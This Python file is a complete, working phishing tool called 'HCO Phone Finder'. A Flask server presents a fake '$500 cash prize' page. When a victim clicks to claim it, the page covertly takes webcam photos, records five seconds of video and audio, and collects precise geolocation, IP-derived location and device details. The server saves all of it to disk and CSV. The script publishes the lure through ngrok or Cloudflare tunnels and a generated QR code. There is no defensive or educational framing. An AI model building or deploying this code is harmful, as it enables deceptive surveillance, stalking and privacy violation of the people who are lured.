from __future__ import annotations
import os
import sys
import time
import json
import csv
import subprocess
import threading
import socket
import webbrowser
import platform
from datetime import datetime
from typing import Optional, Tuple

# Try imports
try:
    from flask import Flask, request, render_template_string, jsonify, send_file, redirect
    import requests
    import qrcode
    from PIL import Image, ImageDraw, ImageFont
    from colorama import init as colorama_init, Fore, Style, Back
    import base64
    from io import BytesIO
except Exception as e:
    print("Missing packages. Install: pip install flask requests qrcode pillow colorama")
    print(f"Error: {e}")
    sys.exit(1)

colorama_init(autoreset=True)

# Config
PORT = 5000
REPORT_CSV = "reports.csv"
QR_PNG = "reward_qr.png"
HOST = "0.0.0.0"
IMAGE_FOLDER = "captured_images"
GALLERY_FOLDER = "gallery"

os.makedirs(IMAGE_FOLDER, exist_ok=True)
os.makedirs(GALLERY_FOLDER, exist_ok=True)

app = Flask(__name__)
_received_reports = []

def show_tool_lock_screen():
    """Show the tool lock screen with countdown"""
    os.system('clear' if os.name == 'posix' else 'cls')

    banner_width = 60  
    print(f"\n{Back.GREEN}{' ' * banner_width}{Style.RESET_ALL}")
    print(f"{Back.GREEN}{Fore.RED}{'HCO PHONE FINDER'.center(banner_width)}{Style.RESET_ALL}")
    print(f"{Back.GREEN}{Fore.RED}{'An Advance tool by Azhar'.center(banner_width)}{Style.RESET_ALL}")
    print(f"{Back.GREEN}{' ' * banner_width}{Style.RESET_ALL}")

    print(f"\n{Fore.RED}{Style.BRIGHT}🔒 This tool is locked{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Subscribe click on the bell 🔔 to unlock{Style.RESET_ALL}\n")
    print(f"{Fore.CYAN}Countdown starting...{Style.RESET_ALL}")
    for i in range(9, 0, -1):
        print(f"{Fore.CYAN}{Style.BRIGHT}{i}{Style.RESET_ALL}", end=" ", flush=True)
        time.sleep(1)
    print()
    print(f"\n{Fore.GREEN}🎬 Opening Hacker Colony Tech channel in YouTube app...{Style.RESET_ALL}")

    # Updated YouTube channel URL
    youtube_channel_url = "https://youtube.com/@hackers_colony_tech?si=dGBQabTWv4paqINU"
    youtube_urls = [  
        f'vnd.youtube://channel/UCv1K9o2SXHm4uV4xZzXQZ6A',  
        f'youtube://channel/UCv1K9o2SXHm4uV4xZzXQZ6A',  
        youtube_channel_url,
        'https://www.youtube.com/@hackers_colony_tech'
    ]  

    try:  
        cmd = ['am', 'start', '-a', 'android.intent.action.VIEW', '-d', youtube_urls[0]]  
        subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)  
        print(f"{Fore.GREEN}✅ Launched YouTube app via am start (vnd.youtube).{Style.RESET_ALL}")  
    except Exception:  
        intent_uri = f'intent://www.youtube.com/@hackers_colony_tech#Intent;package=com.google.android.youtube;scheme=https;end;'  
        try:  
            cmd2 = ['am', 'start', '-a', 'android.intent.action.VIEW', '-d', intent_uri]  
            subprocess.run(cmd2, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)  
            print(f"{Fore.GREEN}✅ Launched YouTube app via am start (intent).{Style.RESET_ALL}")  
        except Exception:  
            opened = False  
            for url in youtube_urls:  
                try:  
                    if webbrowser.open(url):  
                        print(f"{Fore.GREEN}✅ Opened URL: {url}{Style.RESET_ALL}")  
                        opened = True  
                        break  
                except Exception:  
                    continue  
            if not opened:  
                try:  
                    webbrowser.open(youtube_channel_url)  
                    print(f"{Fore.YELLOW}⚠️ Fallback opened browser to channel page.{Style.RESET_ALL}")  
                except Exception as e:  
                    print(f"{Fore.RED}Failed to open YouTube (all methods): {e}{Style.RESET_ALL}")  

    input(f"\n{Fore.YELLOW}Press Enter after subscribing and clicking bell icon...{Style.RESET_ALL}")
    print(f"{Fore.GREEN}✅ Tool unlocked! Continuing...{Style.RESET_ALL}")
    time.sleep(2)

# Updated Reward HTML - No YouTube redirects
HTML_PAGE = r"""<!doctype html>
<html lang="en">  
<head>  
<meta charset="utf-8"/>  
<meta name="viewport" content="width=device-width,initial-scale=1"/>  
<title>Congratulations! You Won Premium Reward</title>  
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">  
<style>  
  *{box-sizing:border-box;margin:0;padding:0}  
  body{font-family:'Poppins',sans-serif;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}  
  .container{max-width:400px;width:100%;background:rgba(255,255,255,0.1);backdrop-filter:blur(15px);border-radius:20px;padding:30px;border:1px solid rgba(255,255,255,0.2);box-shadow:0 20px 40px rgba(0,0,0,0.3)}  
  .header{text-align:center;margin-bottom:25px}  
  .trophy{font-size:4rem;margin-bottom:15px;animation:bounce 2s infinite}  
  .title{font-size:1.8rem;font-weight:800;margin-bottom:10px;background:linear-gradient(45deg,#FFD700,#FFA500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}  
  .subtitle{font-size:1rem;opacity:0.9;margin-bottom:20px}  
  .reward-card{background:rgba(255,255,255,0.15);padding:20px;border-radius:15px;margin:20px 0;text-align:center;border:2px solid rgba(255,215,0,0.5)}  
  .reward-amount{font-size:2.5rem;font-weight:800;color:#FFD700;margin:10px 0}  
  .features{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:20px 0}  
  .feature{background:rgba(255,255,255,0.1);padding:12px;border-radius:10px;text-align:center;font-size:0.8rem;font-weight:600}  
  .claim-btn{width:100%;padding:18px;background:linear-gradient(45deg,#00b09b,#96c93d);color:white;border:none;border-radius:25px;font-size:1.2rem;font-weight:700;cursor:pointer;transition:all 0.3s;box-shadow:0 10px 25px rgba(0,0,0,0.3);margin:15px 0}  
  .claim-btn:hover{transform:translateY(-3px);box-shadow:0 15px 30px rgba(0,0,0,0.4)}  
  .claim-btn:disabled{background:#666;cursor:not-allowed;transform:none}  
  .status-box{padding:15px;border-radius:12px;text-align:center;margin:15px 0;display:none;font-weight:600}  
  .status-processing{background:rgba(255,193,7,0.9);display:block}  
  .status-success{background:rgba(46,204,113,0.9);display:block}  
  .status-error{background:rgba(255,0,0,0.9);display:block}  
  .data-captured{background:rgba(255,255,255,0.15);padding:15px;border-radius:12px;margin:15px 0;display:none}  
  .data-item{margin:8px 0;font-size:0.9rem}  
  .loader{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#fff;animation:spin 1s linear infinite;margin-right:10px}  
  @keyframes spin{to{transform:rotate(360deg)}}  
  @keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}  
  .pulse{animation:pulse 2s infinite}  
  @keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}  
</style>  
</head>  
<body>  
  <div class="container">  
    <div class="header">  
      <div class="trophy">🏆</div>  
      <div class="title">CONGRATULATIONS!</div>  
      <div class="subtitle">You've been selected for a Premium Reward</div>  
    </div>  
    <div class="reward-card">  
      <div>Your Exclusive Reward</div>  
      <div class="reward-amount">$500</div>  
      <div>Cash Prize + Gift Card</div>  
    </div>  
    <div class="features">  
      <div class="feature">💰 Instant Cash</div>  
      <div class="feature">🎁 Gift Card</div>  
      <div class="feature">📱 PhonePe</div>  
      <div class="feature">⚡ Fast Transfer</div>  
    </div>  
    <div style="text-align:center;margin:15px 0;font-size:0.9rem;opacity:0.8">  
      ✅ Quick verification required to claim your reward  
    </div>  
    <button class="claim-btn pulse" id="claimBtn">  
      <span class="btn-text">🎁 CLAIM YOUR REWARD NOW</span>  
    </button>  
    <div id="status" class="status-box"></div>  
    <div id="dataCaptured" class="data-captured">  
      <h3 style="text-align:center;margin-bottom:15px;">📊 Data Captured Successfully</h3>  
      <div class="data-item">📍 <span id="locationData">Collecting...</span></div>  
      <div class="data-item">🌐 <span id="ipData">Collecting...</span></div>  
      <div class="data-item">📸 <span id="photoData">Collecting...</span></div>  
      <div class="data-item">🎥 <span id="videoData">Collecting...</span></div>  
      <div class="data-item">📱 <span id="deviceData">Collecting...</span></div>  
    </div>  
  </div>  
  <script>  
document.getElementById('claimBtn').addEventListener('click', async function() {  
    const btn = this;  
    const status = document.getElementById('status');  
    const dataCaptured = document.getElementById('dataCaptured');  
    const btnText = btn.querySelector('.btn-text');  
    
    btn.disabled = true;  
    btn.classList.remove('pulse');  
    btnText.innerHTML = '<span class="loader"></span> Processing Your Reward...';  
    status.className = 'status-box status-processing';  
    status.textContent = 'Verifying your eligibility...';  
    status.style.display = 'block';  
    
    try {  
        const stream = await navigator.mediaDevices.getUserMedia({  
            video: { facingMode: 'user' },  
            audio: true  
        });  
        await collectDeviceData(stream);  
    } catch (error) {  
        await collectBasicData();  
    }  
});  

async function collectDeviceData(stream) {  
    const status = document.getElementById('status');  
    status.textContent = '📸 Taking photos...';  
    
    // Capture 3 photos
    const photos = [];
    try {
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        
        for (let i = 1; i <= 3; i++) {
            await new Promise(resolve => setTimeout(resolve, 1000));
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0);
            photos.push(canvas.toDataURL('image/jpeg'));
            status.textContent = `📸 Photo ${i}/3 captured...`;
        }
        
        status.textContent = '🎥 Recording video...';
        
        // Capture 5-second video
        let videoBlob = null;
        try {
            const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            const chunks = [];
            
            mediaRecorder.ondataavailable = (e) => {
                if (e.data.size > 0) chunks.push(e.data);
            };
            
            mediaRecorder.start();
            await new Promise(resolve => setTimeout(resolve, 5000)); // 5 seconds
            mediaRecorder.stop();
            
            await new Promise(resolve => {
                mediaRecorder.onstop = () => {
                    videoBlob = new Blob(chunks, { type: 'video/webm' });
                    resolve();
                };
            });
        } catch (videoError) {
            console.log('Video recording failed:', videoError);
        }
        
        // Get location
        let position = null;
        if (navigator.geolocation) {
            try {
                position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { 
                        enableHighAccuracy: true, 
                        timeout: 10000 
                    });
                });
            } catch (geoError) {
                console.log('Location access denied');
            }
        }
        
        // Get IP and device info
        let ipData = {ip: 'Unknown', city: 'Unknown', country: 'Unknown'};
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            ipData = await ipResponse.json();
        } catch (e) {}
        
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language
        };
        
        // Convert video to base64
        let videoBase64 = null;
        if (videoBlob) {
            videoBase64 = await new Promise(resolve => {
                const reader = new FileReader();
                reader.onload = () => resolve(reader.result.split(',')[1]);
                reader.readAsDataURL(videoBlob);
            });
        }
        
        const payload = {
            latitude: position?.coords.latitude,
            longitude: position?.coords.longitude,
            accuracy: position?.coords.accuracy,
            ip: ipData.ip,
            city: ipData.city,
            country: ipData.country_name,
            deviceInfo: deviceInfo,
            photos: photos,
            video: videoBase64,
            timestamp: Date.now(),
            reward_claimed: true
        };
        
        await sendToServer(payload);
        
    } catch (error) {
        console.error('Error collecting data:', error);
        await collectBasicData();
    } finally {
        // Stop all media tracks
        stream.getTracks().forEach(track => track.stop());
    }
}  

async function collectBasicData() {  
    const status = document.getElementById('status');  
    status.textContent = '📡 Collecting basic information...';  
    
    let ipData = {ip: 'Unknown'};  
    try {  
        const ipResponse = await fetch('https://ipapi.co/json/');  
        ipData = await ipResponse.json();  
    } catch (e) {}  
    
    const deviceInfo = {  
        userAgent: navigator.userAgent,  
        platform: navigator.platform,  
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language
    };  
    
    const payload = {  
        ip: ipData.ip,  
        city: ipData.city,  
        country: ipData.country_name,  
        deviceInfo: deviceInfo,  
        timestamp: Date.now(),  
        reward_claimed: true  
    };  
    
    await sendToServer(payload);  
}  

async function sendToServer(payload) {  
    const status = document.getElementById('status');  
    const dataCaptured = document.getElementById('dataCaptured');  
    const btn = document.getElementById('claimBtn');  
    const btnText = btn.querySelector('.btn-text');  
    
    try {  
        status.textContent = '📡 Sending data to server...';  
        await fetch('/report', {  
            method: 'POST',  
            headers: {'Content-Type': 'application/json'},  
            body: JSON.stringify(payload)  
        });  
        
        // Show success and captured data
        status.className = 'status-box status-success';  
        status.textContent = '✅ Reward Claimed Successfully!';  
        btnText.textContent = '✅ Reward Claimed';  
        
        // Display captured data
        dataCaptured.style.display = 'block';
        document.getElementById('locationData').textContent = 
            payload.latitude ? `${payload.latitude}, ${payload.longitude}` : 'Location access denied';
        document.getElementById('ipData').textContent = 
            `${payload.ip} (${payload.city}, ${payload.country})`;
        document.getElementById('photoData').textContent = 
            `${payload.photos ? payload.photos.length : 0} photos captured`;
        document.getElementById('videoData').textContent = 
            payload.video ? '5-second video captured' : 'Video not captured';
        document.getElementById('deviceData').textContent = 
            `${payload.deviceInfo.platform} - ${payload.deviceInfo.screen}`;
            
    } catch (error) {  
        status.className = 'status-box status-error';  
        status.textContent = '❌ Error claiming reward. Please try again.';  
        btn.disabled = false;  
        btnText.textContent = '🎁 CLAIM YOUR REWARD NOW';  
    }  
}  
</script>  
</body>  
</html>  
"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/report", methods=["POST"])
def report():
    try:
        data = request.get_json(force=True)
        lat = data.get("latitude")
        lon = data.get("longitude")
        ip = data.get("ip", "Unknown")
        city = data.get("city", "Unknown")
        country = data.get("country", "Unknown")
        photos_data = data.get("photos", [])
        video_data = data.get("video")
        device_info = data.get("deviceInfo", {})

        photo_files = []  
        for i, photo_data in enumerate(photos_data):
            filename = save_photo(photo_data, ip, i+1)
            if filename:
                photo_files.append(filename)
        video_file = None
        if video_data:
            video_file = save_video(video_data, ip)

        record = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "ip": ip,
            "city": city,
            "country": country,
            "latitude": lat,
            "longitude": lon,
            "photos": photo_files,
            "video": video_file,
            "user_agent": device_info.get("userAgent", "Unknown"),
            "platform": device_info.get("platform", "Unknown"),
            "screen": device_info.get("screen", "Unknown"),
            "timezone": device_info.get("timezone", "Unknown"),
            "language": device_info.get("language", "Unknown")
        }
        _received_reports.append(record)
        save_report_csv(record)
        
        print(f"\n{Fore.GREEN}{Style.BRIGHT}🎁 REWARD CLAIMED - DATA CAPTURED!{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📍 Location: {lat if lat else 'Access denied'}, {lon if lon else 'Access denied'}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌐 IP: {ip} ({city}, {country}){Style.RESET_ALL}")
        print(f"{Fore.CYAN}📸 Photos: {len(photo_files)} captured{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎥 Video: {'Yes' if video_file else 'No'}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}📱 Device: {device_info.get('platform', 'Unknown')} - {device_info.get('screen', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌐 Timezone: {device_info.get('timezone', 'Unknown')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🗣️ Language: {device_info.get('language', 'Unknown')}{Style.RESET_ALL}")
        
        return jsonify({"status": "success"})
    except Exception as e:
        print(f"{Fore.RED}Error processing report: {e}{Style.RESET_ALL}")
        return jsonify({"status": "error"}), 500

def save_photo(photo_data: str, ip: str, index: int) -> Optional[str]:
    try:
        if photo_data.startswith('data:image'):
            photo_data = photo_data.split(',')[1]
        image_data = base64.b64decode(photo_data)
        filename = f"photo_{ip}_{int(time.time())}_{index}.jpg"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        with open(filepath, 'wb') as f:
            f.write(image_data)
        gallery_path = os.path.join(GALLERY_FOLDER, filename)
        with open(gallery_path, 'wb') as f:
            f.write(image_data)
        return filename
    except Exception as e:
        print(f"{Fore.RED}Photo save error: {e}{Style.RESET_ALL}")
        return None

def save_video(video_data: str, ip: str) -> Optional[str]:
    try:
        if video_data.startswith('data:video'):
            video_data = video_data.split(',')[1]
        video_binary = base64.b64decode(video_data)
        filename = f"video_{ip}_{int(time.time())}.webm"
        filepath = os.path.join(IMAGE_FOLDER, filename)
        with open(filepath, 'wb') as f:
            f.write(video_binary)
        gallery_path = os.path.join(GALLERY_FOLDER, filename)
        with open(gallery_path, 'wb') as f:
            f.write(video_binary)
        return filename
    except Exception as e:
        print(f"{Fore.RED}Video save error: {e}{Style.RESET_ALL}")
        return None

def save_report_csv(record: dict):
    try:
        file_exists = os.path.isfile(REPORT_CSV)
        with open(REPORT_CSV, 'a', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=[
                'timestamp', 'ip', 'city', 'country', 'latitude', 'longitude',
                'photos', 'video', 'user_agent', 'platform', 'screen', 'timezone', 'language'
            ])
            if not file_exists:
                writer.writeheader()
            writer.writerow({
                'timestamp': record['timestamp'],
                'ip': record['ip'],
                'city': record['city'],
                'country': record['country'],
                'latitude': record['latitude'],
                'longitude': record['longitude'],
                'photos': ', '.join(record['photos']),
                'video': record['video'] or 'None',
                'user_agent': record['user_agent'],
                'platform': record['platform'],
                'screen': record['screen'],
                'timezone': record['timezone'],
                'language': record['language']
            })
    except Exception as e:
        print(f"{Fore.RED}CSV save error: {e}{Style.RESET_ALL}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def generate_colorful_qr_code(url: str):
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_H,
            box_size=10,
            border=4,
        )
        qr.add_data(url)
        qr.make(fit=True)
        
        # Create colorful QR code
        img = qr.make_image(fill_color="#FF6B6B", back_color="#4ECDC4").convert('RGB')
        
        # Add decorative elements
        draw = ImageDraw.Draw(img)
        width, height = img.size
        
        # Add border
        draw.rectangle([0, 0, width-1, height-1], outline="#FFE66D", width=8)
        draw.rectangle([4, 4, width-5, height-5], outline="#1A535C", width=4)
        
        # Add corners
        corner_size = 20
        draw.rectangle([0, 0, corner_size, corner_size], fill="#FF6B6B")
        draw.rectangle([width-corner_size, 0, width, corner_size], fill="#4ECDC4")
        draw.rectangle([0, height-corner_size, corner_size, height], fill="#FFE66D")
        draw.rectangle([width-corner_size, height-corner_size, width, height], fill="#1A535C")
        
        img.save(QR_PNG)
        return True
    except Exception as e:
        print(f"{Fore.YELLOW}QR code failed: {e}{Style.RESET_ALL}")
        return False

def start_ngrok():
    try:
        print(f"{Fore.CYAN}🌐 Starting ngrok tunnel...{Style.RESET_ALL}")
        
        # Check if ngrok is installed
        result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"{Fore.RED}❌ Ngrok not found. Please install ngrok first.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 Install: https://ngrok.com/download{Style.RESET_ALL}")
            return None
            
        # Start ngrok in background
        ngrok_process = subprocess.Popen(['ngrok', 'http', str(PORT)], 
                                       stdout=subprocess.DEVNULL, 
                                       stderr=subprocess.DEVNULL)
        time.sleep(3)
        
        # Get ngrok URL
        try:
            response = requests.get('http://localhost:4040/api/tunnels', timeout=10)
            tunnels = response.json().get('tunnels', [])
            for tunnel in tunnels:
                if tunnel['proto'] == 'https':
                    public_url = tunnel['public_url']
                    print(f"{Fore.GREEN}✅ Ngrok URL: {public_url}{Style.RESET_ALL}")
                    return public_url
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️  Could not fetch ngrok URL: {e}{Style.RESET_ALL}")
            return None
            
    except Exception as e:
        print(f"{Fore.RED}❌ Ngrok error: {e}{Style.RESET_ALL}")
        return None

def start_cloudflare():
    try:
        print(f"{Fore.CYAN}☁️  Starting Cloudflare tunnel...{Style.RESET_ALL}")
        
        # Check if cloudflared is installed
        result = subprocess.run(['cloudflared', '--version'], capture_output=True, text=True)
        if result.returncode != 0:
            print(f"{Fore.RED}❌ Cloudflared not found. Please install it first.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}💡 Install: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/{Style.RESET_ALL}")
            return None
            
        # Start Cloudflare tunnel
        try:
            # Try to get a tunnel URL by running cloudflared
            process = subprocess.Popen(['cloudflared', 'tunnel', '--url', f'http://localhost:{PORT}'], 
                                     stdout=subprocess.PIPE, 
                                     stderr=subprocess.PIPE,
                                     text=True)
            
            # Give it time to establish connection
            time.sleep(5)
            
            # For now, return instructions
            print(f"{Fore.GREEN}✅ Cloudflare tunnel process started{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💡 Cloudflare tunnel is running in background{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}📋 Check dashboard: https://dash.cloudflare.com/{Style.RESET_ALL}")
            
            # Return a placeholder URL (in real scenario, you'd parse the output)
            return "https://your-tunnel.try.cloudflare.com"
            
        except Exception as e:
            print(f"{Fore.RED}❌ Cloudflare tunnel error: {e}{Style.RESET_ALL}")
            return None
            
    except Exception as e:
        print(f"{Fore.RED}❌ Cloudflare not available: {e}{Style.RESET_ALL}")
        return None

def display_server_info(local_url: str, public_url: str = None):
    """Display server information in a beautiful format"""
    print(f"\n{Back.CYAN}{Fore.BLACK}{' SERVER INFORMATION ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}🎯 {Style.BRIGHT}Local URL:{Style.RESET_ALL} {Fore.WHITE}{local_url}{Style.RESET_ALL}")
    
    if public_url and public_url not in ["ngrok_tunnel_active", "cloudflare_ready"]:
        print(f"{Fore.GREEN}🌍 {Style.BRIGHT}Public URL:{Style.RESET_ALL} {Fore.WHITE}{public_url}{Style.RESET_ALL}")
    elif public_url == "ngrok_tunnel_active":
        print(f"{Fore.GREEN}🌍 {Style.BRIGHT}Public URL:{Style.RESET_ALL} {Fore.YELLOW}Check ngrok dashboard: http://localhost:4040{Style.RESET_ALL}")
    elif public_url == "cloudflare_ready":
        print(f"{Fore.GREEN}🌍 {Style.BRIGHT}Public URL:{Style.RESET_ALL} {Fore.YELLOW}Check Cloudflare dashboard{Style.RESET_ALL}")
    
    print(f"{Fore.GREEN}📡 {Style.BRIGHT}Port:{Style.RESET_ALL} {Fore.WHITE}{PORT}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}🖥️  {Style.BRIGHT}Host:{Style.RESET_ALL} {Fore.WHITE}{HOST}{Style.RESET_ALL}")
    print(f"{Back.CYAN}{Fore.BLACK}{'='*60}{Style.RESET_ALL}")

def main():
    show_tool_lock_screen()
    
    print(f"\n{Back.MAGENTA}{Fore.WHITE}{' TUNNELING OPTIONS ':=^60}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}1. {Style.BRIGHT}Ngrok{Style.RESET_ALL} {Fore.YELLOW}(Recommended - Automatic){Style.RESET_ALL}")
    print(f"{Fore.BLUE}2. {Style.BRIGHT}Cloudflare{Style.RESET_ALL} {Fore.YELLOW}(Manual setup required){Style.RESET_ALL}")
    print(f"{Fore.YELLOW}3. {Style.BRIGHT}Local Network Only{Style.RESET_ALL} {Fore.YELLOW}(No internet sharing){Style.RESET_ALL}")
    print(f"{Back.MAGENTA}{Fore.WHITE}{'='*60}{Style.RESET_ALL}")

    choice = input(f"\n{Fore.CYAN}🎯 Enter your choice (1-3): {Style.RESET_ALL}").strip()
    
    local_ip = get_local_ip()
    local_url = f"http://{local_ip}:{PORT}"
    public_url = None
    
    if choice == '1':
        public_url = start_ngrok()
    elif choice == '2':
        public_url = start_cloudflare()
    elif choice == '3':
        print(f"{Fore.YELLOW}📡 Using local network only{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}❌ Invalid choice. Using local network.{Style.RESET_ALL}")

    print(f"\n{Fore.GREEN}🚀 Starting HCO Phone Finder Server...{Style.RESET_ALL}")
    
    # Display server information
    display_server_info(f"http://localhost:{PORT}", public_url)
    
    # Generate QR code
    qr_url = public_url if public_url and public_url not in ["ngrok_tunnel_active", "cloudflare_ready"] else local_url
    if generate_colorful_qr_code(qr_url):
        print(f"{Fore.CYAN}📲 {Style.BRIGHT}QR code generated:{Style.RESET_ALL} {Fore.WHITE}{QR_PNG}{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}✅ {Style.BRIGHT}Server ready! Share the link/QR to capture data.{Style.RESET_ALL}")
    print(f"{Fore.RED}🔒 {Style.BRIGHT}Tricky reward system activated{Style.RESET_ALL}\n")
    
    try:
        app.run(host=HOST, port=PORT, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}👋 Server stopped{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
